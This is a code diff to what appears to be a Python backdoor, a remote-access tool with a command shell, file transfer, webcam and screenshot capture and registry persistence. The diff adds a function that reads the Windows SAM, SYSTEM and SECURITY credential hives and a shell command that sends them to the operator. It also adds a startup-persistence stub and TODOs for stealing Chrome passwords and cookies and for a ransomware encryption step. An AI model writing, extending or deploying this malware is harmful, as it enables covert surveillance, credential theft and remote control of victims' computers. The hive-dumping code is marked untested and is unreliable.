@@ -1,4 +1,5 @@
 # Standard library imports
+import ctypes
 import cv2
 import json
 import os
@@ -76,6 +77,38 @@ def screenshot():
 # TODO: screenshot other monitors
 
 
+# TODO: SAM - this code is untested
+def get_sam_dump():
+    if not is_admin():
+        return "You must run this function as an Administrator."
+    
+    SAM = r'C:\Windows\System32\config\SAM'
+    SYSTEM = r'C:\Windows\System32\config\SYSTEM'
+    SECURITY = r'C:\Windows\System32\config\SECURITY'
+    
+    try:
+        sam_file = open(SAM, 'rb')
+        system_file = open(SYSTEM, 'rb')
+        security_file = open(SECURITY, 'rb')
+        
+        sam_data = sam_file.read()
+        system_data = system_file.read()
+        security_data = security_file.read()
+        
+        sam_file.close()
+        system_file.close()
+        security_file.close()
+        
+        return sam_data, system_data, security_data
+    except PermissionError:
+        return "Insufficient permissions to access SAM, SYSTEM, or SECURITY files."
+    except FileNotFoundError:
+        return "SAM, SYSTEM, or SECURITY file not found. Please check the file paths."
+    except Exception as e:
+        return f"An unexpected error occurred: {str(e)}"
+
+
+
 def capture_webcam():
     webcam = cv2.VideoCapture(0)
     webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
@@ -104,7 +137,7 @@ def capture_webcam():
             print("Failed to save webcam image")
 
 
-
+# TODO rename from persist to `reg_persist`
 def persist(reg_name, copy_name):
     file_location = os.environ['appdata'] + '\\' + copy_name
     try:
@@ -120,6 +153,11 @@ def persist(reg_name, copy_name):
         reliable_send('[-] Error Creating Persistence With The Target Machine')
 
 
+def startup_persist(file_name):
+    pass
+    # TODO create persistence in startup folder
+
+
 def is_admin():
     global admin
     if platform == 'win32':
@@ -131,8 +169,48 @@ def is_admin():
             admin = '[+] Administrator Privileges!'
     elif platform == "linux" or platform == "linux2" or platform == "darwin":
         pass
-        # TO BE DONE
+        # TODO implmenet checking if these platforms have root/admin access
 
+
+# TODO: more elegant but relibles on an additional library
+# def is_admin():
+#     try:
+#         return ctypes.windll.shell32.IsUserAnAdmin()
+#     except:
+#         return False
+
+
+# def is_admin():
+#     global admin
+#     if platform == 'win32':
+#         try:
+#             temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
+#         except:
+#             admin = False
+#         else:
+#             admin = True
+#     elif platform == "linux" or platform == "linux2" or platform == "darwin":
+#         os.open('/etc/hosts', os.O_RDONLY)
+#         admin = True
+#         # TODO implmenet checking if these platforms have root/admin access
+#     return admin
+
+
+# def admin_string(is_admin):
+#     if(is_admin):
+#         return '[+] Administrator Privileges!'
+#     else:
+#         return '[!!] User Privileges!'
+
+
+# TODO get_chrome_passwords()
+
+# TODO get_chrome_cookies()
+
+# TODO encrypt_user_dir() ransomware element
+# TODO def encrypt_file_in_dir(file_name, key)
+# TODO def gen_key()
+# TODO def send_key(file_name, key)
 
 def shell():
     while True:
@@ -147,6 +225,11 @@ def shell():
             pass  # END
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
+            # try:
+            #     os.chdir(command[3:])
+            #     reliable_send('[+] Changed working dir to ' + os.getcwd())
+            # except Exception as e:
+            #     reliable_send('[-] ' + str(e))
         elif command[:6] == 'upload':
             download_file(command[7:])
         elif command[:8] == 'download':
@@ -195,6 +278,10 @@ def shell():
                 reliable_send('[+] Started!')
             except:
                 reliable_send('[-] Failed to start!')
+        # TODO: This code is untested!
+        elif command[:12] == 'get_sam_dump':
+            sam_dump, system_dump, security_dump = get_sam_dump()
+            reliable_send((sam_dump, system_dump, security_dump))
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
